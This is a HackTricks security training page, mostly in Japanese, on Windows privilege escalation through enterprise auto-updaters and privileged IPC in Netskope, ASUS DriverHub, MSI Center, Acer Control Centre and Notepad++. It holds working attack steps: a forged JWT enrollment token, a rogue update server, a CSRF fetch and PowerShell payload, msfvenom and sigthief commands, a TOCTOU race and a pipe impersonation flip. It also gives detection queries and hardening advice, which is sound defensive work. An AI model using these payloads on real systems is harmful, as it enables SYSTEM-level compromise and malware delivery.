# エンタープライズ向け自動アップデーターと特権付きIPCの悪用（例: Netskope, ASUS & MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低摩擦なIPCインターフェースと特権的な更新フローを公開しているエンドポイントエージェントやアップデーターで見つかる、Windowsのローカル権限昇格チェーンのクラスを一般化して説明します。代表的な例は Netskope Client for Windows < R129 (CVE-2025-0309) で、低権限ユーザーがエンロールメントを攻撃者支配のサーバーに強制し、SYSTEM サービスがインストールする悪意のある MSI を配布できるものです。

再利用可能な主要なアイデア:
- 特権サービスの localhost IPC を悪用して攻撃者サーバーへの再エンロールや再設定を強制する。
- ベンダーの update エンドポイントを実装し、悪意のある Trusted Root CA を配布して、updater を不正に「署名された」パッケージへ向ける。
- CN allow-lists、オプションのダイジェストフラグ、および緩い MSI プロパティなどの弱い署名検証を回避する。
- IPC が「暗号化」されている場合、レジストリに格納された誰でも読めるマシン識別子からキー/IV を導出する。
- サービスがイメージパス/プロセス名で呼び出し元を制限している場合、許可リストにあるプロセスにインジェクションするか、プロセスをサスペンドで起動して最小限のスレッドコンテキストパッチで DLL をブートストラップする。

---
## 1) localhost IPC を介して攻撃者サーバーへのエンロールを強制する

多くのエージェントは、SYSTEM サービスと JSON で通信するユーザーモードの UI プロセスを同梱しています（localhost TCP）。

Netskope で観測されたもの:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

エクスプロイトの流れ:
1) バックエンドホスト（例: AddonUrl）を制御するクレームを持つ JWT enrollment token を作成する。署名を不要にするため alg=None を使用する。
2) あなたの JWT と tenant 名を付けて、provisioning コマンドを呼び出す IPC メッセージを送信する:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが登録/設定のためにあなたの不正なサーバーにアクセスし始める、例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 呼び出し元の検証が path/name-based の場合は、許可リスト登録済みのベンダー製バイナリからリクエストを発生させる（§4を参照）。

---
## 2) 更新チャネルを乗っ取り SYSTEM としてコードを実行する

クライアントがあなたのサーバーと通信したら、期待されるエンドポイントを実装し、攻撃者用のMSIに誘導する。典型的なシーケンス:

1) /v2/config/org/clientconfig → 非常に短い更新間隔を持つJSON設定を返す、例:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM形式のCA証明書を返す。サービスはそれをLocal MachineのTrusted Rootストアにインストールする。  
3) /v2/checkupdate → 悪意のあるMSIと偽バージョンを指すメタデータを返す。

Bypassing common checks seen in the wild:
- Signer CN allow-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と等しいかだけをチェックしている場合がある。攻撃者のCAはそのCNを持つエンド証明書を発行してMSIに署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の問題のないMSIプロパティを含める。インストール時に強制されない。
- Optional digest enforcement: 設定フラグ（例: check_msi_digest=false）が追加の暗号検証を無効にする。

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現して、標準ユーザーから有効な暗号化コマンドを送信できる。一般的なヒント：エージェントが突然IPCを「暗号化」し始めたら、HKLM下のデバイスID、product GUID、install ID 等を鍵材として探せ。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

一部のサービスはTCP接続のPIDを解決してピアを認証し、イメージのパス/名前を Program Files 以下の許可されたベンダー実行ファイル（例: stagentui.exe, bwansvc.exe, epdlp.exe）と比較することで認証を行おうとする。

実用的なバイパス手法:
- 許可リスト入りプロセス（例: nsdiag.exe）にDLLインジェクションし、その内部からIPCをプロキシする。
- 許可リスト入りバイナリをCREATE_SUSPENDEDで起動し、CreateRemoteThreadを使わずにプロキシDLLをブートストラップしてドライバによる改ざん防止ルールを満たす（§5参照）。

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

製品はしばしば minifilter/OB callbacks driver（例: Stadrv）を同梱し、保護対象プロセスのハンドルから危険な権限を削ぐ：
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

これら制約を尊重する信頼できるユーザーモードローダーの手順:
1) ベンダーのバイナリを CREATE_SUSPENDED で CreateProcess する。
2) それでも取得可能なハンドルを取得する：プロセスに対して PROCESS_VM_WRITE | PROCESS_VM_OPERATION、スレッドに対して THREAD_GET_CONTEXT/THREAD_SET_CONTEXT のハンドル（既知のRIPでコードをパッチする場合は THREAD_RESUME だけでも可）。
3) ntdll!NtContinue（または他の早期に確実にマップされるスロット）を、指定したDLLパスで LoadLibraryW を呼び、その後戻る小さなスタブで上書きする。
4) ResumeThread してプロセス内でスタブを発動させ、DLLをロードさせる。

既に保護されたプロセスに対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（自分で作成したため）ため、ドライバのポリシーは満たされる。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、悪意のあるMSI署名を自動化し、必要なエンドポイント /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate を提供する。
- UpSkope は任意（オプションでAES暗号化）のIPCメッセージを作成するカスタムIPCクライアントで、許可リスト入りバイナリ発信のための suspended-process 注入も含む。

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub は 127.0.0.1:53000 でユーザーモードのHTTPサービス (ADU.exe) を提供し、ブラウザからの呼び出しが https://driverhub.asus.com から来ることを期待している。オリジンフィルタは Origin ヘッダと `/asus/v1.0/*` で公開されるダウンロードURLに対して単に `string_contains(".asus.com")` を実行するだけである。したがって `https://driverhub.asus.com.attacker.tld` のような攻撃者管理のホストもチェックを通過し、JavaScriptから状態を変更するリクエストを発行できる。追加のバイパスパターンについては [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照。

実践的な流れ:
1) `.asus.com` を埋め込んだドメインを登録し、そこに悪意あるページをホストする。
2) `fetch` や XHR を使って `http://127.0.0.1:53000` の特権エンドポイント（例: `Reboot`, `UpdateApp`）を呼び出す。
3) ハンドラが期待するJSONボディを送る — パックされたフロントエンドのJSが下にスキーマを示している。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
以下に示す PowerShell CLI も、Origin ヘッダーが信頼された値に偽装されていると成功します:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) 不十分なコード署名検証と証明書クローン (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` は JSON ボディで定義された任意の実行ファイルをダウンロードして `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。ダウンロード URL の検証は同じサブストリングロジックを再利用しているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` は受け入れられます。ダウンロード後、ADU.exe は単に PE に署名が含まれていることと Subject 文字列が ASUS と一致することを確認してから実行します – `WinVerifyTrust` もチェーン検証も行いません。

フローを武器化する手順:
1) ペイロードを作成する（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の署名者情報をクローンする（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` のなりすましドメインでホストし、上記のブラウザ CSRF で UpdateApp をトリガーする。

Origin と URL フィルタがどちらもサブストリングベースで、かつ署名者チェックが文字列比較のみであるため、DriverHub は昇格したコンテキストで攻撃者バイナリを取得して実行します。

---
## 1) アップデーターのコピー/実行パス内の TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center の SYSTEM サービスは TCP プロトコルを公開しており、各フレームは `4-byte ComponentID || 8-byte CommandID || ASCII arguments` です。コアコンポーネント（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が搭載されています。そのハンドラ:
1) 渡された実行ファイルを `C:\Windows\Temp\MSI Center SDK.exe` にコピーする。
2) `CS_CommonAPI.EX_CA::Verify` を使って署名を検証する（証明書の Subject が “MICRO-STAR INTERNATIONAL CO., LTD.” と等しく、かつ `WinVerifyTrust` が成功すること）。
3) 攻撃者制御の引数で一時ファイルを SYSTEM として実行するスケジュールタスクを作成する。

コピーされたファイルは検証と `ExecuteTask()` の間でロックされません。攻撃者は:
- 正当な MSI 署名済みバイナリを指す Frame A を送信する（署名チェックが通り、タスクがキューに入ることを保証する）。
- その後に悪意あるペイロードを指す Frame B を繰り返し送り、検証完了直後に `MSI Center SDK.exe` を上書きする競合状態を発生させる。

スケジューラが起動すると、元のファイルを検証していても上書きされたペイロードを SYSTEM として実行します。確実な悪用には、TOCTOU の窓が勝てるまで CMD_AutoUpdateSDK をスパムする二つの goroutine/スレッドを使用します。

---
## 2) カスタムの SYSTEM レベル IPC となりすましの悪用 (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` にロードされるすべてのプラグイン/DLL は `HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存される Component ID を受け取ります。フレームの最初の4バイトがそのコンポーネントを選択するため、攻撃者は任意のモジュールへコマンドをルーティングできます。
- プラグインは独自のタスクランナーを定義できる。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、**no signature validation** のまま `API_Support.EX_Task::ExecuteTask()` を直接呼び出す — 任意のローカルユーザーが `C:\Users\<user>\Desktop\payload.exe` を指すだけで確定的に SYSTEM 実行が得られる。
- Wireshark でループバックをスニッフィングするか dnSpy で .NET バイナリをインストルメントすると、Component ↔ command のマッピングがすぐに明らかになる。カスタムの Go/ Python クライアントでフレームをリプレイできる。

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL はリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可している。コマンド ID `7` とファイルパスを送るとサービスのプロセス生成ルーチンが呼び出される。
- クライアントライブラリは引数とともに magic terminator バイト (113) をシリアライズする。Frida/`TsDotNetLib` による動的インストルメンテーション（計装のヒントは [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、ネイティブハンドラはこの値を `SECURITY_IMPERSONATION_LEVEL` と整合性 SID にマッピングしてから `CreateProcessAsUser` を呼ぶことが示される。
- 113 (`0x71`) を 114 (`0x72`) に置き換えると、フルの SYSTEM トークンを保持し高い整合性 SID (`S-1-16-12288`) を設定する汎用ブランチに入る。したがって、生成されたバイナリはローカルでもクロスマシンでも制限のない SYSTEM として実行される。
- これを公開されたインストーラフラグ（`Setup.exe -nocheck`）と組み合わせれば、ベンダーのハードウェアがなくてもラボ VM 上で ACC を起動してパイプを試すことができる。

これらの IPC バグは、ローカルホストサービスが相互認証（ALPC SIDs、`ImpersonationLevel=Impersonation` フィルタ、トークンフィルタリング）を強制する必要性と、すべてのモジュールの「任意のバイナリを実行する」ヘルパーが同一の署名者検証を共有するべき理由を浮き彫りにしています。

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

古い WinGUp ベースの Notepad++ アップデータは更新の真正性を完全には検証していませんでした。攻撃者がアップデートサーバのホスティングプロバイダを侵害すると、XML マニフェストを改竄し、特定のクライアントだけを攻撃者の URL にリダイレクトすることができました。クライアントが信頼された証明書チェーンと有効な PE 署名の両方を強制しないまま任意の HTTPS 応答を受け入れていたため、被害者はトロイ化された NSIS `update.exe` を取得して実行してしまいました。

オペレーショナルフロー（ローカルエクスプロイト不要）:
1. **Infrastructure interception**: CDN/hosting を侵害して更新チェックに対して攻撃者のメタデータで応答し、悪意のあるダウンロード URL を指し示す。
2. **Trojanized NSIS**: インストーラはペイロードを取得/実行し、2つの実行チェーンを悪用する:
   - **Bring-your-own signed binary + sideload**: 署名済みの Bitdefender `BluetoothService.exe` を同梱し、その検索パスに悪意ある `log.dll` を置く。署名済みバイナリが実行されると、Windows が `log.dll` をサイドロードし、`log.dll` が復号してリフレクティブに Chrysalis バックドアをロードする（Warbird で保護され、静的検出を困難にするために API ハッシュを使用）。
   - **Scripted shellcode injection**: NSIS はコンパイル済みの Lua スクリプトを実行し、Win32 API（例：`EnumWindowStationsW`）を使用してシェルコードを注入し、Cobalt Strike Beacon をステージする。

任意の auto-updater に対するハードニング/検出の示唆:
- ダウンロードされたインストーラに対して **certificate + signature verification** を強制する（ベンダーの署名者をピンニングし、CN/チェーンが不一致なら拒否）と、更新マニフェスト自体（例：XMLDSig）に署名する。マニフェストで制御されるリダイレクトは検証されない限りブロックする。
- **BYO signed binary sideloading** をポストダウンロード検知のピボットとして扱う：署名済みベンダー EXE が正規のインストールパス外から DLL 名をロードした場合（例：Bitdefender が Temp/Downloads から `log.dll` をロードする）や、アップデータが一時フォルダに非ベンダー署名のインストーラを配置/実行した場合にアラートを出す。
- このチェーンで観測された **malware-specific artifacts** を監視する（一般的なピボットとして有用）：mutex `Global\Jdhfv_1.0.1`、異常な `gup.exe` の `%TEMP%` への書き込み、Lua 駆動のシェルコード注入段階など。

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> が Notepad++ 以外のインストーラーを起動する</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

これらのパターンは、unsigned manifests を受け入れるか installer signers のピン留めに失敗する任意の updater に一般化されます — network hijack + malicious installer + BYO-signed sideloading によって、“trusted” updates を装った remote code execution が発生します。

---
## 参考資料
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
